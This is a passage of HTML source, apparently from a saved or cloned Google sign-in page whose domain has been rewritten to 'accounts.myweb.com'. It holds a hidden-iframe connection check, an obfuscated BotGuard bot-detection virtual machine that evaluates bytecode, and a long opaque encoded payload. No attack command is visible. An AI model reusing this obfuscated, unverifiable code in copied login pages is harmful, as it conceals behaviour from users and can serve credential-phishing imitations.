				return a = 0 <= a.indexOf("?") ? a + "&" + encodeURIComponent(b) + "=" + encodeURIComponent(c) : a + "?" + encodeURIComponent(b) + "=" + encodeURIComponent(c)
			};
			G.j = function() {
				var a = window.document.createElement("iframe"),
				    b = a.style;
				b.visibility = "hidden";
				b.width = "1px";
				b.height = "1px";
				b.position = "absolute";
				b.top = "-100px";
				a.src = this.o();
				a.id = this.b;
				Gr.appendChild(a)
			};
			var Gu = function(a) {
				return function(b) {
					var c = b.origin.toLowerCase();
					b = b.data;
					for (var d = a.length,
					    e = 0; e < d && !a[e].s(c, b); e++);
				}
			},
			    Gv = function() {
				if (window.postMessage) {
					var a;
					a = window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;
					var b = window.__CHECK_CONNECTION_CONFIG.newResultElementId;
					( Gr = document.getElementById(a)) ? b ? ( Gs = document.getElementById(b),
					a = !0) : (Gq.error("Unable to locate the input element to storeCheckConnection result", "new id: " + String(b)),
					a = !1) : (Gq.error("Unable to locate the iframe anchor to append connection test iframe", ["element id: " + a]),
					a = !1);
					if (a) {
						a = window.__CHECK_CONNECTION_CONFIG.domainConfigs;
						if (!a) {
							if (!window.__CHECK_CONNECTION_CONFIG.iframeUri) {
								Gq.error("Missing iframe URL in old configuration");
								return
							}
							a = [{
								iframeUri : window.__CHECK_CONNECTION_CONFIG.iframeUri,
								domainSymbol : "youtube"
							}]
						}
						if (0 != a.length) {
							for (var b = a.length,
							    c = [],
							    d = 0; d < b; d++)
								c.push(new Gt(a[d].iframeUri, a[d].domainSymbol));
							Gh(window, "message", Gu(c));
							for ( d = 0; d < b; d++)
								c[d].j()
						}
					}
				}
			},
			    Gw = function() {
				if (window.__CHECK_CONNECTION_CONFIG) {
					var a = window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;
					if (window.postMessage) {
						var b = document.getElementById(a);
						b ? b.value = "1" : Gq.error("Unable to locate the input element to storepostMessage test result", ["element id: " + a])
					}
				}
			};
			G_checkConnectionMain = Gq.f(Gv);
			G_setPostMessageSupportFlag = Gq.f(Gw);
		</script>
		<script>
			window.__CHECK_CONNECTION_CONFIG = {
				newResultElementId : 'checkConnection',
				domainConfigs : [{
					iframeUri : '###//accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.myweb.com\x26v\x3d-340325501',
					domainSymbol : 'youtube'
				}],
				iframeUri : '',
				iframeOrigin : '',
				iframeParentElementId : 'cc_iframe_parent',
				postMsgSupportElementId : 'pstMsg',
				msgContent : 'accessible'
			};
			G_setPostMessageSupportFlag();
			G_checkConnectionMain();
		</script>
		<script type="text/javascript">
			/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */
			Function('var B=function(T,N,D){if((N=typeof T,"object")==N)if(T){if(T instanceof Array)return"array";if(T instanceof Object)return N;if((D=Object.prototype.toString.call(T),"[object Window]")==D)return"object";if("[object Array]"==D||"number"==typeof T.length&&"undefined"!=typeof T.splice&&"undefined"!=typeof T.propertyIsEnumerable&&!T.propertyIsEnumerable("splice"))return"array";if("[object Function]"==D||"undefined"!=typeof T.call&&"undefined"!=typeof T.propertyIsEnumerable&&!T.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==N&&"undefined"==typeof T.call)return"object";return N},R=this,U=(new function(){},function(T,N){try{M(this,T,N)}catch(D){e(this,D)}}),H=(U.prototype.s=function(T,N,D,K){for(;D--;)109!=D&&73!=D&&N.K[D]&&(N.K[D]=N[K](N[T](D),this));N[T]=this},function(T,N){return N=n(T),N&128&&(N=N&127|n(T)<<7),N}),f=false,G=(U.prototype.u=function(T,N,D,K,L){if(N=T[0],4==N){T=T[1];try{for(K=(D=atob(T),T=[],N=0);K<D.length;K++){for(L=D.charCodeAt(K);255<L;)T[N++]=L&255,L>>=8;T[N++]=L}this.a=T}catch(Q){a(this,17,Q)}O(this)}else if(1==N)D=T[2],L=T[1],D.push(this.Y(164).length,this.Y(206).length,this.Y(105).length,this.Y(40)),this.m=L,b(this,80,T[3]),this.K[23]&&y(this,this.Y(23));else{if(2==N){if(T=(((4<(0<(N=(L=(L=(T=S((D=T[2],this).Y(164).length+2,2),this.Y(151)),0<L.length&&v(this,164,S(L.length,2).concat(L),15),this.Y(177))&511,L-=this.Y(164).length+5,this).Y(206),4<N.length&&(L-=N.length+3),L)&&v(this,164,S(L,2).concat(A(L)),10),N.length)&&v(this,164,S(N.length,2).concat(N),153),L=A(2).concat(this.Y(164)),L)[1]=L[0]^3,L[3]=L[1]^T[0],L)[4]=L[1]^T[1],window.btoa)){for(K=0,N="";K<L.length;K+=8192)N+=String.fromCharCode.apply(null,L.slice(K,K+8192));T=T(N).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")}else T=void 0;if(T)T="!"+T;else for(N=0,T="";N<L.length;N++)K=L[N][this.h](16),1==K.length&&(K="0"+K),T+=K;return(((this.Y(164).length=D[0],this.Y(206)).length=D[1],this.Y(105)).length=D[2],L=T,b)(this,40,D[3]),L}if(3==N)y(this,T[1]);else if(6==N)return y(this,T[1])}},function(T,N,D,K){try{for(K=0;79669387488!=K;)T+=(N<<4^N>>>5)+N^K+D[K&3],K+=2489668359,N+=(T<<4^T>>>5)+T^K+D[K>>>11&3];return[T>>>24,T>>16&255,T>>8&255,T&255,N>>>24,N>>16&255,N>>8&255,N&255]}catch(L){throw L;}}),M=function(T,N,D,K){(((((((((((((((((((((((((((((((((((T.C=T.L(),T.S=function(T,N,D,K,h,W){return T=(((h=(K=function(){return K[D.g+(h[D.b]===N)-!W[D.b]]},function(){return K()}),D=this,W=D.u,h)[D.h]=function(T){K[D.f]=T},h)[D.h](T),h)},T).K=[],T).I=function(T,N,D){return N=(D=function(){return T},function(){return D()}),N[this.h]=function(L){T=L},N},b)(T,109,0),b(T,73,0),b(T,215,function(T){E(T,4)}),b(T,59,function(T,N,D,K,h){for(D=n((N=[],T)),K=0;K<D;K++)h=n(T),N.push(T.Y(h));D=n(T),b(T,D,function(T,L){for(L=0;L<N.length;L++)(0,N[L])(T)})}),b)(T,180,function(T,N,D,K,h){0!==(K=(h=(N=(K=(D=(N=n(T),n)(T),n)(T),T).Y(N),T.Y(n(T))),D=T.Y(D),T.Y(K)),N)&&(K=u(T,K,h,1,N,D),N.addEventListener(D,K,f),b(T,146,[N,D,K]))}),b(T,250,0),b)(T,154,function(T){w(T,1)}),b(T,136,function(T,N,D){D=(N=n(T),n)(T),b(T,D,function(T){return eval(T)}(T.Y(N)))}),b(T,108,function(T){w(T,4)}),b)(T,241,T),b)(T,146,0),b(T,142,function(T,N,D,K){K=(D=(N=n(T),n(T)),n(T)),b(T,K,T.Y(N)||T.Y(D))}),b(T,94,function(T,N,D,K,h,W,k){0==(k=(K=(h=(N=r(T),N).J,N.M),D=N.T,D).length,k)?W=new K[h]:1==k?W=new K[h](D[0]):2==k?W=new K[h](D[0],D[1]):3==k?W=new K[h](D[0],D[1],D[2]):4==k?W=new K[h](D[0],D[1],D[2],D[3]):a(T,22),b(T,N.D,W)}),b(T,37,function(T,N,D){D=(N=n(T),n(T)),N=T.Y(N),b(T,D,B(N))}),b(T,177,0),b(T,125,function(T,N){T.m&&(N=T.Y(109),b(T,109,T.a.length),T.i.push([3,N]))}),b(T,7,function(T,N){N=T.Y(n(T)),X(T,N)}),b)(T,105,[]),b)(T,46,function(T){E(T,2)}),b)(T,129,function(T,N,D,K,h,W,k,p,Y,m){if(void 0!=(D=(N=n(T),H)(T),K="",T.K[47]))for(h=T.Y(47),k=h.length,W=0;D--;)W=(W+H(T))%k,K+=h[W];else{for(K=(h=0,[]);h<D;h++)K.push(n(T));for(W=(D=[],h=0);h<K.length;)k=K[h++],128>k?D[W++]=String.fromCharCode(k):191<k&&224>k?(p=K[h++],D[W++]=String.fromCharCode((k&31)<<6|p&63)):239<k&&365>k?(p=K[h++],Y=K[h++],m=K[h++],k=((k&7)<<18|(p&63)<<12|(Y&63)<<6|m&63)-65536,D[W++]=String.fromCharCode(55296+(k>>10)),D[W++]=String.fromCharCode(56320+(k&1023))):(p=K[h++],Y=K[h++],D[W++]=String.fromCharCode((k&15)<<12|(p&63)<<6|Y&63));K=D.join("")}b(T,N,K)}),b)(T,236,function(T,N,D,K){D=(N=n(T),n(T)),K=n(T),b(T,K,T.Y(N)>>D)}),b)(T,181,function(T,N,D){D=(N=n(T),n)(T),b(T,D,T.Y(D)+T.Y(N))}),b)(T,55,55),b)(T,119,function(T,N,D,K){(K=(D=(N=n(T),n)(T),n)(T),T).Y(N)[T.Y(D)]=T.Y(K)}),b)(T,133,function(T,N){(T=(N=n(T),T).Y(N),T)[0].removeEventListener(T[1],T[2],false)}),b)(T,52,function(T,N,D,K){(K=(D=(N=n(T),n(T)),n)(T),T.Y(N)==T.Y(D))&&b(T,K,T.Y(K)+1)}),b)(T,205,function(T,N,D,K){N=(D=(K=(D=(N=n(T),n(T)),n(T)),T.Y(D)),T.Y(N)),b(T,K,N[D])}),b)(T,40,2048),b)(T,219,function(T,N,D){N=(D=(N=n(T),n(T)),T.K)[N]&&T.Y(N),b(T,D,N)}),T).i=[],b)(T,68,function(T,N,D,K){if(N=T.v.pop()){for(D=n(T);0<D;D--)K=n(T),N[K]=T.K[K];T.K=(N[151]=T.K[151],N[40]=T.K[40],N)}else b(T,109,T.a.length)}),T).m=false,b)(T,117,function(T,N,D,K){(K=(D=(N=n(T),n(T)),n)(T),b)(T,K,(T.Y(N)in T.Y(D))+0)}),b)(T,14,function(T,N,D,K,h){D=(N=n(T),n)(T),K=T.Y(n(T)),h=T.Y(n(T)),D=T.Y(D),b(T,N,u(T,D,K,h))}),b(T,80,{}),b(T,229,0),T.v=[],T).X=function(T,N){(N.push(T[0]<<24|T[1]<<16|T[2]<<8|T[3]),N).push(T[4]<<24|T[5]<<16|T[6]<<8|T[7]),N.push(T[8]<<24|T[9]<<16|T[10]<<8|T[11])},b)(T,93,function(T,N,D){0!=(D=(N=n(T),n)(T),T).Y(N)&&b(T,109,T.Y(D))}),b)(T,206,A(4)),b)(T,151,[]),b)(T,232,function(T){T.V(4)}),b(T,246,R),b)(T,34,function(T){E(T,1)}),b(T,19,function(){}),b)(T,220,function(T,N,D){(N=n(T),D=n(T),b)(T,D,""+T.Y(N))}),K=D.P||function(){},b)(T,83,function(T,N,D,K,h,W){if((T=(K=(D=(N=(h=(K=(D=(N=n(T),n)(T),n(T)),n(T)),T).Y(N),T).Y(D),T.Y(K)),T.Y(h)),"object")==B(N)){for(W in h=[],N)h.push(W);N=h}for(W=(h=0,N).length;h<W;h+=K)D(N.slice(h,h+K),T)}),b(T,164,[165,0,0]),b)(T,21,function(T,N,D,K,h){for(K=(N=n(T),D=H(T),h=0,[]);h<D;h++)K.push(n(T));b(T,N,K)}),b)(T,26,function(T,N){(N=r(T),b)(T,N.D,N.J.apply(N.M,N.T))}),N&&"!"==N.charAt(0))?(T.A=N,K()):(D=!!D.P,T.m=D,T.a=[],V(T,[4,N]),V(T,[5,K]),c(T,D))},r=function(T,N,D,K,L,Q){for(K=((N={},D=n(T),N.D=n(T),N).T=[],n(T))-1,L=n(T),Q=0;Q<K;Q++)N.T.push(n(T));for(N.J=T.Y(D),N.M=T.Y(L);K--;)N.T[K]=T.Y(N.T[K]);return N},e=((U.prototype.B={},U).prototype.b="caller",function(T,N){T.A=("E:"+N.message+":"+N.stack).slice(0,2048)}),C=function(T,N){return T[N]<<24|T[N+1]<<16|T[N+2]<<8|T[N+3]},V=function(T,N){T.i.splice(0,0,N)},a=function(T,N,D,K,L){((D=((0==((N=(L=T.Y(73),[N,L>>8&255,L&255]),void 0)!=K&&N.push(K),T.Y(151).length)&&(T.K[151]=void 0,b(T,151,N)),K="",D)&&(D.message&&(K+=D.message),D.stack&&(K+=":"+D.stack)),T).Y(40),3)<D&&(K=K.slice(0,D-3),D-=K.length+3,K=z(K.replace(/\\r\\n/g,"\\n")),v(T,206,S(K.length,2).concat(K),12)),b)(T,40,D)},v=function(T,N,D,K,L,Q){for(K=((206==(L=T.Y(N),N)?(N=function(T,N,D,K){if((D=(N=L.length,N-4)>>3,L.W)!=D){K=[(L.W=D,0),0,0,Q],D=(D<<3)-4;try{L.l=G(C(L,D),C(L,D+4),K)}catch(k){throw k;}}L.push(L.l[N&7]^T)},Q=T.Y(229)):N=function(T){L.push(T)},K)&&N(K&255),0),T=D.length;K<T;K++)N(D[K])},y=((U.prototype.G=function(T,N,D,K,L){for(L=K=0;L<T.length;L++)K+=T.charCodeAt(L),K+=K<<10,K^=K>>6;return K=new (K+=K<<3,K^=K>>11,T=K+(K<<15)>>>0,Number)(T&(1<<N)-1),K[0]=(T>>>N)%D,K},U).prototype.h="toString",function(T,N,D){return((D=T.Y(109),T).a&&D<T.a.length?(b(T,109,T.a.length),X(T,N)):b(T,109,N),O)(T,D)}),q=function(T,N,D){if(D=T.i.pop())P(T,D),c(T,N)},b=function(T,N,D){if(109==N||73==N)if(T.K[N])T.K[N][T.h](D);else T.K[N]=T.I(D);else if(164!=N&&206!=N&&105!=N&&151!=N||!T.K[N])T.K[N]=T.S(D,T.Y);250==N&&(T.$=void 0,b(T,109,T.Y(109)+4))},P=(U.prototype.w=function(T,N,D,K,L,Q){if(this.A)return this.A;try{L=[],Q=[],K=!!T,V(this,[1,K,L,N]),V(this,[2,T,L,Q]),c(this,K),D=Q[0]}catch(g){e(this,g),D=this.A,T&&T(D)}return D},function(T,N,D,K,L){if(1==(D=N[0],D))T.u(N);else if(2==D){D=(K=N[3],N[1]);try{T.m=false,L=T.u(N)}catch(Q){e(T,Q),L=T.A}(D&&D(L),K).push(L)}else if(3==D)T.u(N);else if(4==D)T.u(N);else if(5==D)T.m=false,N=N[1],N();else if(6==D)return L=N[2],b(T,194,N[6]),b(T,80,L),T.u(N)}),w=function(T,N,D,K){(D=n(T),K=n(T),v)(T,K,S(T.Y(D),N))},E=(U.prototype.c=false,function(T,N,D,K){for(K=(D=n(T),0);0<N;N--)K=K<<8|n(T);b(T,D,K)}),S=(((((U.prototype.L=(window.performance||{}).now?function(){return window.performance.now()|0}:function(){return+new Date},U.prototype.N=function(T,N,D){if(3==T.length){for(D=0;3>D;D++)N[D]+=T[D];for(T=[13,8,13,12,16,5,(D=0,3),10,15];9>D;D++)N[3](N,D%3,T[D])}},U.prototype).g=35,U).prototype.f=36,U.prototype.H=R.requestIdleCallback?function(T){requestIdleCallback(T,{timeout:4})}:R.setImmediate?function(T){setImmediate(T)}:function(T){setTimeout(T,0)},U).prototype.Z=function(T,N,D){return T^((N^=N<<13,N^=N>>17,N=(N^N<<5)&D)||(N=1),N)},U.prototype).V=function(T,N,D,K){D=(D=n((T&=(N=T&4,3),this)),K=n(this),this.Y(D)),N&&(D=z((""+D).replace(/\\r\\n/g,"\\n"))),T&&v(this,K,S(D.length,2)),v(this,K,D)},function(T,N,D,K){for(K=N-1,D=[];0<=K;K--)D[N-1-K]=T>>8*K&255;return D}),O=function(T,N,D,K,L,Q,g,I){try{for(Q=(L=void 0,0),K=5001,D=T.a.length;(--K||T.c)&&(Q=T.Y(109))<D;)try{b(T,73,Q),g=n(T),(L=T.Y(g))&&L.call?L(T):a(T,21,0,g)}catch(h){h!=T.B&&(I=T.Y(55),55!=I?(b(T,I,h),b(T,55,55)):a(T,22,h))}K||a(T,33)}catch(h){try{a(T,22,h)}catch(W){e(T,W)}}return D=T.Y(80),N&&b(T,109,N),D},u=(U.prototype.Y=function(T,N){if(void 0===(N=this.K[T],N))throw a(this,30,0,T),this.B;return N()},function(T,N,D,K,L,Q){return function(){var g=K&1,I=[6,N,D,void 0,L,Q,arguments];if((K&2&&c(T,false),g)&&T.i.length)V(T,I);else return P(T,I)}}),A=function(T,N){for(N=[];T--;)N.push(255*Math.random()|0);return N},c=function(T,N){0!=T.i.length&&(N&&(10>T.L()-T.C||0!=document.hidden)?q(T,N):N?T.H(function(){(T.C=T.L(),q)(T,N)}):q(T,N))},X=(U.prototype.o=function(T,N,D,K,L,Q){for(D=[],Q=K=0;Q<T.length;Q++)for(L=L<<N|T[Q],K+=N;7<K;)K-=8,D.push(L>>K&255);return D},U.prototype.j=function(T,N,D,K){try{K=T[(N+2)%3],T[N]=T[N]-T[(N+1)%3]-K^(1==N?K<<D:K>>>D)}catch(L){throw L;}},function(T,N){((T.v.push(T.K.slice()),T.K)[109]=void 0,b)(T,109,N)}),n=function(T,N,D){if(!((N=T.Y(109),N)in T.a))throw a(T,31),T.B;return(void 0==T.$&&(T.$=C(T.a,N-4),T.F=void 0),T.F!=N>>3&&(T.F=N>>3,D=[0,0,0,T.Y(250)],T.O=G(T.$,T.F,D)),b(T,109,N+1),T).a[N]^T.O[N%8]},z=function(T,N,D,K,L){for(K=(N=[],D=0);K<T.length;K++)L=T.charCodeAt(K),128>L?N[D++]=L:(2048>L?N[D++]=L>>6|192:(55296==(L&64512)&&K+1<T.length&&56320==(T.charCodeAt(K+1)&64512)?(L=65536+((L&1023)<<10)+(T.charCodeAt(++K)&1023),N[D++]=L>>18|240,N[D++]=L>>12&63|128):N[D++]=L>>12|224,N[D++]=L>>6&63|128),N[D++]=L&63|128);return N};try{window.addEventListener("unload",function(){},f),window.addEventListener("test",null,Object.defineProperty({},"passive",{get:function(){f={passive:true}}}))}catch(T){}var x=(R.botguard||(R.botguard={}),R).botguard;x.vKZ=function(T,N,D){D=new U(T,{P:N}),this.invoke=function(T,N,Q){return(Q=D.w(N&&T,Q),T&&!N)&&T(Q),Q}},x.bg=function(T,N,D){return T&&T.substring&&(D=x[T.substring(0,3)])?new D(T.substring(3),N):new x.vKZ(T,N)};')();
		</script>
		<script type="text/javascript">
			document.bg = new botguard.bg('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